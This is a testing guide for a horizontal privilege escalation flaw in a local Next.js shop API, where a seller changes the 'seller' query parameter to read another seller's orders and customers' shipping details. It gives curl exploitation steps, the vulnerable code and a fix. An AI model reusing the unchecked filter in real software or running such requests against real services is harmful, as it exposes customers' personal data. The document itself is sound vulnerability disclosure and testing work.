# Manual Testing Guide: Seller Filter Bypass Vulnerability

## Objective
Test if sellers can manipulate the `seller` query parameter to view other sellers' orders or all orders in the system.

## Setup

### 1. Database has been seeded with:
- **Mario** (mario@example.com / password123) - Seller & Admin
  - User ID: `69de78f940c0132402814d18`
  - Has 1 order (sold by Mario)

- **Giulia** (giulia@example.com / password123) - Seller
  - User ID: `69de78f940c0132402814d1a`
  - Has 1 order (sold by Giulia)

### 2. Test Orders Created:
- Order 1: Sold by Mario, bought by Giulia
- Order 2: Sold by Giulia, bought by Mario

## Manual Testing Steps

### Step 1: Login as Mario
1. Open browser to http://localhost:3000/signin
2. Login with:
   - Email: `mario@example.com`
   - Password: `password123`
3. After successful login, open DevTools (F12) → Application → Cookies
4. Copy the session cookie value (`next-auth.session-token` or `__Secure-next-auth.session-token`)

### Step 2: Test the Vulnerability

#### Test 2A: Fetch ALL orders (no filter)
```bash
# Replace <SESSION_TOKEN> with the cookie value from Step 1
curl -s "http://localhost:3000/api/orders" \
  -H "Cookie: next-auth.session-token=<SESSION_TOKEN>" \
  | jq '.'
```

**Expected:** Should only return Mario's orders (where seller=69de78f940c0132402814d18)
**Actual:** Returns ALL orders from all sellers

#### Test 2B: Fetch own orders explicitly
```bash
curl -s "http://localhost:3000/api/orders?seller=69de78f940c0132402814d18" \
  -H "Cookie: next-auth.session-token=<SESSION_TOKEN>" \
  | jq '.'
```

**Expected:** Returns Mario's orders only
**Result:** Should work correctly

#### Test 2C: Fetch Giulia's orders (EXPLOITATION)
```bash
curl -s "http://localhost:3000/api/orders?seller=69de78f940c0132402814d1a" \
  -H "Cookie: next-auth.session-token=<SESSION_TOKEN>" \
  | jq '.'
```

**Expected:** Should return 403 Forbidden (unauthorized)
**Actual:** Returns Giulia's orders with full customer details!

### Step 3: Verify the Exposed Data

The response from Test 2C will include sensitive information:
- Order ID
- Buyer information (name, user ID)
- Shipping address (full name, address, city, postal code)
- Order items and prices
- Payment method

This is a **Horizontal Privilege Escalation** vulnerability where Mario (a seller) can view Giulia's (another seller) orders and customer data.

## Automated Test

Alternatively, save your session cookie to a file and run:

```bash
# Save session cookie
echo "next-auth.session-token=<YOUR_TOKEN>" > mario_session.txt

# Test all orders
echo "=== Test 1: All Orders (VULNERABLE) ==="
curl -s "http://localhost:3000/api/orders" \
  -H "Cookie: $(cat mario_session.txt)" \
  | jq '.[] | {seller, _id, buyer: .user.name}'

# Test Giulia's orders
echo "=== Test 2: Giulia's Orders (VULNERABLE) ==="
curl -s "http://localhost:3000/api/orders?seller=69de78f940c0132402814d1a" \
  -H "Cookie: $(cat mario_session.txt)" \
  | jq '.'
```

## Evidence to Capture

1. **HTTP Request showing unauthorized access:**
   - Screenshot of curl command with Giulia's seller ID
   - Response showing HTTP 200 (instead of 403)

2. **Response data showing PII exposure:**
   - Order details from another seller
   - Customer shipping addresses
   - Purchase information

3. **Code showing the vulnerability:**
   - File: `/nextjs/src/app/api/orders/route.ts`
   - Lines 30-34

## Vulnerability Details

**Type:** Authorization Bypass / Horizontal Privilege Escalation
**Severity:** HIGH
**CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Root Cause:**
The endpoint checks authentication (isSeller) but does NOT verify authorization (seller parameter matches user ID).

**Vulnerable Code:**
```typescript
const seller = searchParams.get('seller') || '';
const sellerFilter = seller ? { seller } : {};
const orders = await OrderModel.find({ ...sellerFilter }).populate('user', 'name');
```

**Fix:**
```typescript
const seller = searchParams.get('seller') || '';

// Validate authorization
if (seller && seller !== session.user.id && !session.user.isAdmin) {
  return NextResponse.json({ message: 'Unauthorized' }, { status: 403 });
}

// Default to own orders for non-admins
const sellerFilter = seller
  ? { seller }
  : session.user.isAdmin ? {} : { seller: session.user.id };
```
